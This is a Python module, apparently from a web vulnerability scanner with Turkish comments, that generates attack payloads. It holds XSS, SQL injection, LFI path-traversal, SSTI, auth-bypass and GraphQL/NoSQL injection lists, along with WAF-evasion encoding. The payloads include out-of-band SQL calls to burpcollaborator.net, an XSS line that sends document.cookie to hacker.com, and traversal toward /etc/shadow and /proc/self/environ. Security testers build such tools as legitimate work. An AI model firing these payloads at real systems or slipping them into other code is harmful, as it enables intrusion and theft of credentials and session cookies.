# path: core/payload_generator.py

import random
import re
import asyncio
import json # Faz 29 AI yanıtını işlemek için eklendi
from typing import List, Optional, Dict, Any, Tuple
from urllib.parse import quote
# import time # KRİTİK DÜZELTME: Cooldown kontrolü artık Engine'de olduğu için kaldırıldı.

# Local Imports
from .data_simulator import DataSimulator
# from .neural_engine import NeuralEngine # Artık doğrudan NeuralEngine çağrılmayacak.

class PayloadGenerator:
    """
    [AR-GE v2.2 - Nihai Tip Güvenliği & CHAOS ENGINE & FAZ 36 OPTİMİZASYON]
    Güvenlik taramaları için dinamik, encode edilmiş ve WAF atlatma (evasion) yeteneğine sahip
    gelişmiş payload üretim motoru.
    
    Özellikler:
    - Dinamik Obfuscation (Rastgele Encoding)
    - Polyglot Payloadlar (XSS + SQLi + LFI tek satırda)
    - WAF Evasion (Cloudflare, AWS WAF, ModSecurity Bypass)
    - SSTI ve GraphQL desteği
    - FAZ 29: AI-Driven Payload Üretimi
    - FAZ 40: AI Kuyruk Yönetimi (Payload Governor)
    """
    
    # FAZ 15: Sınıf seviyesinde Evasion Modu bayrağı.
    EVASION_MODE = False
    
    # --- XSS PAYLOADS (CHAOS EDITION) ---
    BASE_XSS_PAYLOADS = [
        # Basic & Fast
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        
        # Polyglots (Farklı context'lerden kaçmak için)
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "\"`'><script>/* */alert(1)</script>",
        "';alert(1)//",
        
        # Advanced Event Handlers
        "<body onpageshow=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        
        # Angular/Vue/React Spesifik (Template Injection)
        "{{7*7}}",
        "{{constructor.constructor('alert(1)')()}}",
        "<div v-html=\"'alert(1)'\"></div>"
    ]
    
    # --- SQL INJECTION PAYLOADS (CHAOS EDITION) ---
    BASE_SQLI_PAYLOADS = [
        # 1. Auth Bypass / Boolean Simple
        "' OR 1=1 -- ",
        "\" OR 1=1 -- ",
        "' OR '1'='1",
        "admin'--",
        
        # 2. Union Based (Generic & MySQL)
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        
        # 3. Error Based (Syntax Breakers)
        "'", "\"", "';", "')", "'))",
        
        # 4. Time-Based (Sleep - Polyglot)
        "' AND (SELECT 10 FROM (SELECT(SLEEP(5)))a) -- ",
        "'; WAITFOR DELAY '0:0:5'--",
        
        # 5. WAF Bypass Specific (Comment Obfuscation)
        "'/**/OR/**/1=1/**/--",
        "admin'/*",
        
        # 6. Out of Band (DNS)
        "'; exec master..xp_dirtree '\\burpcollaborator.net\foo'--",
        "' UNION SELECT LOAD_FILE('\\\\burpcollaborator.net\\foo')--"
    ]
    
    # --- FAZ 36 LFI/PATH TRAVERSAL VERİLERİ ---
    LFI_SENSITIVE_FILES: Dict[str, List[str]] = {
        # Linux (Yüksek Güvenilirlik İmza)
        "/etc/passwd": ["root:x:0:0", "daemon:x:", "/bin/bash"],
        "/etc/shadow": ["root:", ":$"],
        "/etc/hosts": ["127.0.0.1", "localhost"],
        "/proc/self/environ": ["USER=", "PATH="],
        # Log Poisoning Hedefleri
        "/var/log/apache2/access.log": ["GET /", "HTTP/1.1"],
        "/var/log/nginx/access.log": ["GET /", "HTTP/1.1"],
        "/var/log/auth.log": ["session opened"],
        "/var/log/messages": ["kernel:", "error"],
        # Windows
        "C:\\Windows\\win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
        "C:\\boot.ini": ["[boot loader]", "[operating systems]"],
    }
    
    LFI_TRAVERSAL_PATTERNS: List[str] = [
        "{path}",
        "../{path}",
        "../../{path}",
        "../../../{path}",
        "../../../../{path}",
        "..%2f{path}", "..%2f..%2f{path}", "..%2f..%2f..%2f{path}", "..%2f..%2f..%2f..%2f{path}",
        "..%252f..%252f{path}", "..%252f..%252f..%252f{path}", "..%252f..%252f..%252f..%252f{path}",
        "php://filter/read=convert.base64-encode/resource={path}",
        "data://text/plain;base64,PD9waHAgZWNobyAnU1lOQVJBX0xGSSdwd25lZSc7ID8+/{path}", 
        "../../../../{path}%00", "../../../../{path}%00.jpg", 
        "..\\{path}", "..\\..\\{path}", "..\\..\\..\\{path}", "..\\..\\..\\..\\{path}",
        "..%5c..%5c{path}", "..%5c..%5c..%5c{path}",
    ]
    
    # --- FAZ 36 IDOR TEST ID'LERİ ---
    IDOR_TEST_IDS = [1, 2, 10, 100, 9999]
    
    # --- FAZ 36 AUTH BYPASS VERİLERİ (AuthBypassScanner'dan Taşındı) ---
    ADMIN_PATHS = [
        "/admin", "/administrator", "/dashboard", "/login", "/wp-admin",
        "/cpanel", "/config", "/api/admin", "/user/admin", "/root",
        "/system", "/auth", "/panel", "/controlpanel", "/secure", "/management", "/manager",
    ]

    AUTH_BYPASS_PAYLOADS = [
        "/", # Temel yol (Zaten deneniyor, ama bypass için kullanılır)
        "//", # Çift slash (Normalization hatası) <-- Düzeltildi
        "/%2e/", # URL Encoded dot
        "/%2e%2e/", # Double dot encoded
        "/.", # Dot suffix
        "..;/", # Tomcat path traversal
        "/./", # Current dir
        "/?", # Query trick
        "/%20", # Space trick
        "/%09", # Tab trick
        "/.git", # Git exposure (Bazen bypass sağlar)
        "/static/..%2f", # Static files üzerinden traversal
        ";/admin", # Semicolon injection
        "/*", # Yorum satırı (Apache/Nginx)
    ]
    # -------------------------------------------------------------------------
    
    # --- SSTI (Server Side Template Injection) ---
    BASE_SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}"
    ]
    
    # V6.0: Dinamik, teknolojiye özel payload'lar
    CONTEXTUAL_PAYLOADS = {
        "Next.js": [ "<img src=/ onerror=this.src='//hacker.com?'+document.cookie>", "&quot;onanimationend=alert(1) style=animation:none;@keyframes none{}&quot;", ],
        "Vercel": [ "'+alert(1)+'", ],
        "PHP": [ "<?php echo 'XSS_TEST'; ?>", "<!--?php echo 'XSS'; ?-->", "${alert(1)}", "' or 1=1/*", ],
        "Apache": [ "%2e%2e%2f" ],
        "Nginx": [ "/../../../../etc/passwd" ],
        "Python": [ "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}" ] # Jinja2 LFI
    }

    # FAZ 20: GraphQL için Özel Payloadlar
    GRAPHQL_INTROSPECTION_PAYLOADS = [
        '{"query": "{__schema{types{name,kind}}}"}',
        '{"query": "{__schema{queryType{name} mutationType{name}}}"}',
        '{"query": "{__schema{types{name,fields{name,args{name,type{name}}}}}}"}',
        '{"query": "{ synara_test_error }"}', 
    ]
    
    GRAPHQL_INJECTION_PAYLOADS = [
        '1 OR 1=1', '" OR 1=1 --', '{"$ne": null}', '{"$gt": ""}',
    ]

    # --- CONTEXT-AWARE XSS (Genişletilmiş) ---
    CONTEXT_AWARE_PAYLOADS = {
        "SCRIPT": [ "';alert(1)//", "'-alert(1)-'", "</script><script>alert(1)</script>", "\\x3cscript\\x65alert(1)\\x3c/script\\x65", ],
        "ATTRIBUTE": [ "\" onmouseover=alert(1) x=\"", "' autofocus onfocus=alert(1) x='", "\"><svg/onload=alert(1)>", "\" style=\"behavior:url(#default#time2)\" onbegin=\"alert(1)\"", "&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;=alert&#x28;1&#x29;", ],
        "BODY": [ "<svg/onload=alert(1)>", "<details/open/ontoggle=alert(1)>", "<img src=x onerror=alert(1)>", "<iframe/src=javascript:alert(1)>", "<\x73\x63\x72\x69\x70\x74>alert(1)</script>", ],
    }

    def __init__(self, neural_engine_instance): # FAZ 40: Artık NeuralEngine değil, Engine objesini bekler.
        # Engine objesi, Engine.queue_ai_payload_request metodu ile enjekte edilecek.
        # Ancak uyumluluk için, Engine'e zaten Engine.queue_ai_payload_request metodu eklendiği varsayılır.
        self.engine_controller = neural_engine_instance # Geçici isim NeuralEngine yerine Engine instance'ını tutacak
        
    @classmethod
    def set_evasion_mode(cls, enabled: bool):
        """WAF Evasion modunu açar veya kapatır."""
        cls.EVASION_MODE = enabled

    def _extract_tech_info(self, results_list: List[dict]) -> List[str]:
        """
        Motor sonuç listesinden Heuristic Scanner'ın bulduğu teknoloji ipuçlarını çıkarır.
        """
        tech_info = set()
        
        # KRİTİK KORUMA (v2.2): Gelen argümanın liste olmadığından emin ol. 
        # Eğer liste değilse (örn. str), döngüye girmeden boş döndür.
        if not isinstance(results_list, list):
            return []

        for result in results_list:
            if not isinstance(result, dict): # Ek koruma: Listenin elemanının da sözlük olduğundan emin ol.
                continue
            
            if result['category'] == 'HEURISTIC' and 'Sunucu yazılımı' in result['message']:
                match = re.search(r':\s*(.*)', result['message'])
                if match:
                    tech_info.add(match.group(1).strip())
            
            if result['category'] == 'HEADERS' and 'X-Powered-By' in result['message']:
                match = re.search(r'\((.*?)\)', result['message'])
                if match:
                    tech_info.add(match.group(1).strip())

        return list(tech_info)

    def generate_contextual_payloads(self, results_list: List[dict]) -> List[str]:
        """
        Motor sonuçlarına göre ilgili teknolojilere ait dinamik payload'ları üretir.
        """
        tech_hints = self._extract_tech_info(results_list)
        contextual_payloads = set()
        
        if not tech_hints:
            return []

        # self.engine_controller.log(f"[AI FUZZING] Bağlamsal payload'lar için teknoloji ipuçları: {', '.join(tech_hints)}", "INFO") # Loglama artık Engine üzerinden yapılabilir

        for hint in tech_hints:
            for key, payloads in self.CONTEXTUAL_PAYLOADS.items():
                if key.lower() in hint.lower():
                    for payload in payloads:
                        contextual_payloads.add(self._process_payload(payload))
        
        return list(contextual_payloads)
    
    async def generate_context_aware_xss_payloads(self, context_type: Optional[str], context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Heuristic Engine'den gelen yansıma bağlamına göre XSS payload'ları üretir.
        FAZ 40: AI Kuyruğu üzerinden payload'ları ister.
        """
        if not context_type:
            return []
        
        context_data = context if context is not None else {}
        context_data["reflection_context"] = context_type
        
        ai_payloads: List[str] = []
        
        # --- FAZ 40: KUYRUK ÜZERİNDEN AI ÇAĞRISI ---
        # Payload Generator, artık doğrudan Engine'e kuyruğa atması için talimat verir.
        try:
            ai_payloads = await self.engine_controller.queue_ai_payload_request(context_data, "XSS", 5)
        except AttributeError:
            # Eğer Engine'e doğru bağlanamadıysa veya metot yoksa (eski versiyon)
            self.engine_controller.log("[PAYLOAD GOV] KRİTİK HATA: Engine Kuyruk Arayüzü bulunamadı. Simüle payload kullanılıyor.", "CRITICAL")
            ai_payloads = DataSimulator.simulate_ai_payloads("XSS", 5)
        
        # 2. Statik Context-Aware Payload'ları Yükle
        context_key = context_type.upper().strip()
        static_context_payloads = self.CONTEXT_AWARE_PAYLOADS.get(context_key, [])
        
        final_payloads = set(ai_payloads) # Buraya AI'dan gelen (veya simüle) payload'lar zaten eklendi.
        
        for payload in static_context_payloads:
            final_payloads.add(payload)
            processed = self._process_payload(payload)
            final_payloads.add(processed)
            
        # self.engine_controller.log(f"[XSS FUZZING] Context-Aware ({context_key}) payload'lar eklendi: {len(final_payloads)} adet (AI dahil).", "INFO")
        return list(final_payloads)

    async def generate_xss_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Kodlanmış XSS payload'larını döndürür (AI destekli).
        FAZ 40: AI Kuyruğu üzerinden payload'ları ister.
        """
        # 1. AI-Driven Payload'ları Al (Genel XSS bağlamı)
        ai_payloads: List[str] = []
        
        # --- FAZ 40: KUYRUK ÜZERİNDEN AI ÇAĞRISI ---
        try:
            ai_payloads = await self.engine_controller.queue_ai_payload_request(context or {}, "XSS", 5)
        except AttributeError:
            self.engine_controller.log("[PAYLOAD GOV] KRİTİK HATA: Engine Kuyruk Arayüzü bulunamadı. Simüle payload kullanılıyor.", "CRITICAL")
            ai_payloads = DataSimulator.simulate_ai_payloads("XSS", 5)
            
        # 2. Statik Payload'ları Yükle
        final_payloads = set(ai_payloads)
        for payload in self.BASE_XSS_PAYLOADS:
            processed = self._process_payload(payload)
            final_payloads.add(processed)
            final_payloads.add(self._url_encode(processed))
            
        return list(final_payloads)

    async def generate_sqli_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        SQL Injection için payload'ları döndürür (AI destekli).
        FAZ 40: AI Kuyruğu üzerinden payload'ları ister.
        """
        # 1. AI-Driven Payload'ları Al
        ai_payloads: List[str] = []

        # --- FAZ 40: KUYRUK ÜZERİNDEN AI ÇAĞRISI ---
        try:
            ai_payloads = await self.engine_controller.queue_ai_payload_request(context or {}, "SQLi", 5)
        except AttributeError:
            self.engine_controller.log("[PAYLOAD GOV] KRİTİK HATA: Engine Kuyruk Arayüzü bulunamadı. Simüle payload kullanılıyor.", "CRITICAL")
            ai_payloads = DataSimulator.simulate_ai_payloads("SQLi", 5)
            
        # 2. Statik Payload'ları Yükle
        
        # KRİTİK DÜZELTME (v2.2): AI'dan gelen payload'ların sadece string olduğundan emin ol.
        # Bu, AI'ın yanlışlıkla liste/sözlük döndürdüğü (ve sqli.py'deki set'e eklendiğinde TypeError'a neden olduğu) durumu engeller.
        safe_ai_payloads = set()
        for p in ai_payloads:
            try:
                safe_ai_payloads.add(str(p))
            except Exception:
                self.engine_controller.log(f"[PAYLOAD GOV] UYARI: AI'dan gelen payload string'e çevrilemedi: {type(p).__name__}", "WARNING")
                pass 
            
        final_payloads = safe_ai_payloads

        for payload in self.BASE_SQLI_PAYLOADS:
            processed = self._process_payload(payload, is_sqli=True)
            final_payloads.add(self._url_encode(processed))
        
        return list(final_payloads)
    
    # --- FAZ 36 KRİTİK METOT: LFI SCANNER İÇİN PAYLOAD ÜRETİMİ ---
    def generate_lfi_attack_paths(self) -> List[Tuple[str, str]]:
        """
        LFI tarayıcısı için hassas dosyaları (target_file) ve 
        onları okumak için gereken path traversal payload'larını üretir.
        
        Returns: List[Tuple[target_file: str, payload: str]]
        """
        file_payloads: List[Tuple[str, str]] = []

        # 1. Tüm hassas dosyalar üzerinde dön
        for sensitive_path in self.LFI_SENSITIVE_FILES.keys():
            # 2. Her dosya için tüm traversal pattern'larını uygula
            for pattern in self.LFI_TRAVERSAL_PATTERNS:
                # Path'i pattern içine yerleştir
                payload = pattern.format(path=sensitive_path)
                file_payloads.append((sensitive_path, payload))
                
        # Evasion modu açıksa, payload'ların bazılarını daha fazla obfuscate et
        if self.EVASION_MODE:
            final_payloads = set()
            for target, payload in file_payloads:
                # Sadece temel payload'u alıp evasion uygulayalım (LFI için URL encoding zaten pattern'larda var)
                final_payloads.add((target, payload))
            
            return list(final_payloads)
            
        return file_payloads

    # --- FAZ 36 KRİTİK METOT: IDOR SCANNER İÇİN ID ÜRETİMİ ---
    def generate_idor_test_ids(self) -> List[int]:
        """
        IDOR tarayıcısının hedef ID'leri test etmesi için temel sayısal payload listesini döndürür.
        """
        # IDOR Scanner'dan taşınan listeyi döndür
        return self.IDOR_TEST_IDS

    # --- FAZ 36 KRİTİK METOT: AUTH BYPASS SCANNER İÇİN ADMIN YOLLARI ---
    def generate_admin_paths(self) -> List[str]:
        """
        Auth Bypass Scanner'ın tarayacağı temel yönetim dizini listesini döndürür.
        """
        return self.ADMIN_PATHS
    
    # --- FAZ 36 KRİTİK METOT: AUTH BYPASS SCANNER İÇİN BYPASS PAYLOAD'LARI ---
    def generate_auth_bypass_payloads(self) -> List[str]:
        """
        Auth Bypass Scanner'ın deneyeceği URL bypass teknikleri listesini döndürür.
        """
        return self.AUTH_BYPASS_PAYLOADS


    def generate_ssti_payloads(self) -> List[str]:
        return self.BASE_SSTI_PAYLOADS

    def generate_graphql_introspection_payloads(self) -> List[str]:
        return self.GRAPHQL_INTROSPECTION_PAYLOADS
        
    def generate_graphql_injection_payloads(self) -> List[str]:
        return self.GRAPHQL_INJECTION_PAYLOADS

    def _process_payload(self, payload: str, is_sqli: bool = False) -> str:
        """
        Payload'u mevcut moda (Standart/Evasion) göre işler.
        """
        if not self.EVASION_MODE:
            return payload
            
        # --- WAF EVASION TEKNİKLERİ ---
        if is_sqli:
            # SQLi Evasion: 
            # 1. Boşlukları yorum satırlarıyla değiştir (/**/)
            payload = payload.replace(" ", "/**/")
            
            # 2. 'UNION' gibi kelimelerin case'ini değiştir (uNiOn)
            if "UNION" in payload:
                payload = payload.replace("UNION", self._random_case("UNION"))
            if "SELECT" in payload:
                payload = payload.replace("SELECT", self._random_case("SELECT"))
                
            return payload
        else:
            # XSS Evasion:
            # 1. 'alert' yerine 'confirm' veya 'prompt' kullan (WAF filtrelerini şaşırtmak için)
            if "alert" in payload and random.choice([True, False]):
                payload = payload.replace("alert", "confirm")
            
            # 2. Tag aralarına gereksiz boşluk/karakter ekle (örn: < img)
            if "<script>" in payload:
                payload = payload.replace("<script>", "<script >")
                
            # 3. Double URL Encoding
            return self._url_encode(payload) # Basit bir evasion katmanı

    def _random_case(self, text: str) -> str:
        """Metni rastgele büyük/küçük harfe çevirir (SeLeCt)."""
        return "".join(random.choice([k.upper(), k.lower()]) for k in text)

    def _url_encode(self, data: str) -> str:
        """Veriyi URL kodlamasından geçirir."""
        return quote(data)

    def _html_encode(self, data: str) -> str:
        """HTML Varlık Kodlaması."""
        return data.replace('<', '&#60;').replace('>', '&#62;').replace('"', '&#34;').replace("'", '&#39;')